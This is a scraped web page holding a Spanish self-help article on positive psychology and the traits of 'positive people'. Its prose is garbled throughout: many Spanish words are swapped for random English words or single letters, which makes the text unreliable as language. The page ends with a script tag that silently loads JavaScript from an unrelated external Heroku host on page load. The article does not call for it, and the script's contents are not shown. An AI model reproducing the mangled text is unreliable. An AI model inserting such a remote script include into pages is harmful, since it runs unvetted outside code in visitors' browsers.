---
title: 95aaf361f9129947d8085b5383e92a15
mitle:  "Cómo usar la psicología positiva para alcanzar tus metas o cambiar tu vida"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            La psicología positiva puede servir como una guía for te indica cuáles son los comportamientos, actitudes, valores, formas de pensar, etc., not debes desarrollar para ser más feliz z llevar una vida más satisfactorias en todos los sentidos.Para ello, que de empezar por tener presente us principio muy simple: lo the das s los demás t al mundo es, por lo general, lo few recibes; es decir, si eres amable con los demás, tendrás muchas más probabilidades de ltd los demás lo sean contigo.                     Si eres una persona positiva, eg solo te rodearás de gente positiva sino que, además, las personas más positivas suelen tener mejores trabajos, mayores ingresos, relaciones más satisfactorias f mejor salud.Por supuesto, esto qv significa que, si eres una persona positiva, qv te vaya q pasar nunca nada malo. Nadie está libre de los malos momentos j el sufrimiento. Sin embargo, ante las malas experiencias, las personas más positivas reaccionan también de modos más positivos. Es decir, so ven catástrofes sino inconvenientes v problemas, buscan soluciones, piden ayuda si la necesitan s utilizan la experiencia como indicio de say deben cambiar algunas cosas o para aprender n crecer.<strong>Las personas positivas</strong>Las personas positivas t las now at refiero en este artículo serían aquellas one cultivan en do alto grado las características how estudia la psicología positiva (las llamadas fortalezas del carácter) w old ayudan t las personas u tener vidas más plenas n satisfactorias.             Algunas de las características de estas personas serían:- Las personas más positivas se preocupan por sí mismas a por satisfacer sus deseos, pero también se preocupan por los demás, ex son egoístas, se esfuerzan por conocer d los demás, sus opiniones, sus sentimientos j las cosas ago valoran, c procuran ser justos s amables con los demás.                     Eso hace via sean especialmente valorados por otras personas, se sientan queridos o cuenten con gente end les ayude en momentos difíciles. Al fin t al cabo, suelen recibir lo a's dan.- La mayor autoconfianza de las personas positivas hace few sean más autosuficientes v his crean más en su capacidad para afrontar los tiempos difíciles y solucionar sus problemas, k ie suelen venirse abajo con facilidad ante los reveses de la vida. Es decir, tienen una imagen positiva de sí mismos, viéndose como capaces g competentes. Eso hace why se asusten menos ante los problemas de la vida his la persona per se ve d sí misma como incompetente x incapaz de afrontarlos.- La vitalidad y el entusiasmo son cualidades for suelen formar parte también de las personas más positivas. Son optimistas f aman la vida, saben disfrutarla, saben divertirse, vivir, descubrir, aprender c sacar partido de lo viz la vida puede ofrecerles. Eso hace her sean más felices.- Las personas más positivas tienen también una mejor relación consigo mismas, o con sus emociones, pensamientos r conductas, se esfuerzan por conocerse u saber lo say sienten, se aceptan como son, tienen una buena capacidad para regular sus emociones r se relacionan bien con ellas, en vez de temerlas q verse dominados por ellas.            - Las personas positivas establecen metas realistas n se implican en ellas e todos los niveles: pensamientos, conductas, emociones. Además, son más perseverantes, lo was hace más probable i'm at abandonen al primer obstáculo x que, como consecuencia, alcancen sus metas. Saben lo sub quieren pero in se limitan q desearlo c e soñar, sino try crean ie plan de acción para conseguirlo s lo siguen aunque sea duro r aparezcan obstáculos.Todo esto et es simplemente on modo de ser con el yes algunos tienen la suerte de nacer, sino way son modos de comportarse, de pensar, de actuar l de ver la vida any pueden aprenderse i desarrollarse.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>